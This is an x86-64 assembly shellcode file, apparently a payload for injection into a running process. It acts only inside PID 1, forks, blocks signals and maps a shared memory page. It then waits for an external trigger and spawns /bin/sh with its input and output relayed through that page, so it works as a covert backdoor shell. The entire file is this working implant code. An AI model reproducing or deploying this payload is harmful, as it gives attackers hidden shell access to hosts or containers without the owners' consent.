#include <sys/syscall.h>

#define O_NONBLOCK 04000

#define STDIN_FILENO 0
#define STDOUT_FILENO 1
#define STDERR_FILENO 2

.text

.globl _start


_start:
	push	%rax
	pushfq

	push	%rcx
	push	%r11

	push	%rdi
	push	%rsi
	push	%rdx
	push	%r10
	push	%r9
	push	%r8

	mov	$SYS_gettid, %rax
	syscall

	cmp	$1, %rax
	jne	exit

	mov	$SYS_fork, %rax
	syscall

	cmp	$0, %rax
	jne	exit

        mov     $2, %rdi
	lea	sigmask_full(%rip), %rsi
	xor	%rdx, %rdx
	mov	$8, %r10

        mov     $SYS_rt_sigprocmask, %rax
        syscall

	cmp	$0, %rax
	jl	exit_child

	xor	%rdi, %rdi
	mov	$(1 << 12), %rsi
	mov	$3, %rdx
	mov	$0x2022, %r10
	mov	$-1, %r8
	xor	%r9, %r9

	mov	$SYS_mmap, %rax
	syscall

	cmp	$-4096, %rax
	ja	exit_child

	push	%rax

	mov	$1, %rdi
	mov	%rax, %rsi

	mov	$SYS_clock_gettime, %rax
	syscall

	cmp	$0, %rax
	jl	exit_child

	pop	%rdi
	mov	$0x0c58328fd3b6c5bb, %rsi
	mov	%rsi, (%rdi)
	mov	8(%rdi), %rsi

	call	lock

	cmp	$0, %rax
	je	shell_main

exit:
	pop	%r8
	pop	%r9
	pop	%r10
	pop	%rdx
	pop	%rsi
	pop	%rdi

	pop	%r11
	pop	%rcx

	mov     %rsp, %rax
	add     $(128 + 3 * 8), %rax
	popfq
	mov     %rax, %rsp
	mov     -(128 + 2 * 8)(%rsp), %rax
	jmp     *-(128 + 8)(%rsp)

exit_child:
	mov	0, %rdi

	mov	$SYS_exit, %rax
	syscall


lock:
	push	%r14
	push	%r15

	push	%rbx

	mov	$0x67390a7494d83aa4, %r14
	mov	$0x8bdb9683da40e963, %r15

lock_loop:
	test	%r14, %r14
	jnz	lock_loop

	test	%r15, %r15
	jnz	lock_loop

lock_end:
	pop	%rbx

	pop	%r15
	pop	%r14

	ret


milisleep:
	lea	timespec(%rip), %rdi
	xor	%rsi, %rsi

	mov	$35, %rax
	syscall

	ret


shell_main:
	sub	$24, %rsp
	mov	%rdi, (%rsp)

	xor	%rdi, %rdi
	xor	%rsi, %rsi

	mov	$SYS_setpgid, %rax
	syscall

	lea	8(%rsp), %rdi
	mov	$O_NONBLOCK, %rsi
	
	mov	$SYS_pipe2, %rax
	syscall

	lea	16(%rsp), %rdi
	mov	$O_NONBLOCK, %rsi
	
	mov	$SYS_pipe2, %rax
	syscall

	mov	$SYS_fork, %rax
	syscall

	test	%rax, %rax
	je	shell_execve

	mov	(%rsp), %r15


shell_loop:
	mov	(16 + 8 + (((1 << 12) - 32) / 2))(%r15), %rdx

	cmp	$0, %rdx
	je	shell_loop_read

	mov	12(%rsp), %rdi
	mov	%r15, %rsi
	add	$(16 + 8 + (((1 << 12) - 32) / 2) + 8), %rsi

	mov	$SYS_write, %rax
	syscall

	movq	$0, (16 + 8 + (((1 << 12) - 32) / 2))(%r15)

shell_loop_read:
	cmpq	$0, 16(%r15)
	jne	shell_loop_tail

	mov	16(%rsp), %rdi
	mov	%r15, %rsi
	add	$(16 + 8), %rsi
	mov	$(((1 << 12) - 32) / 2), %rdx

	mov	$SYS_read, %rax
	syscall

	cmp	$0, %rax
	jl	shell_loop_tail

	mov	%rax, 16(%r15)

shell_loop_tail:
	call	milisleep

	jmp	shell_loop
	

shell_execve:
	mov	8(%rsp), %rdi
	mov	$STDIN_FILENO, %rsi

	mov	$SYS_dup2, %rax
	syscall

	mov	20(%rsp), %rdi
	mov	$STDOUT_FILENO, %rsi

	mov	$SYS_dup2, %rax
	syscall

	mov	20(%rsp), %rdi
	mov	$STDERR_FILENO, %rsi

	mov	$SYS_dup2, %rax
	syscall

	lea	bin_sh(%rip), %rdi
	mov	$0, %rsi
	mov	$0, %rdx

	mov	$SYS_execve, %rax
	syscall
	

bin_sh:
	.ascii	"/bin/sh\0"

timespec:
	.quad	0
	.quad	500000000

sigmask_full:
	.quad	0xfffffffc7fffffff
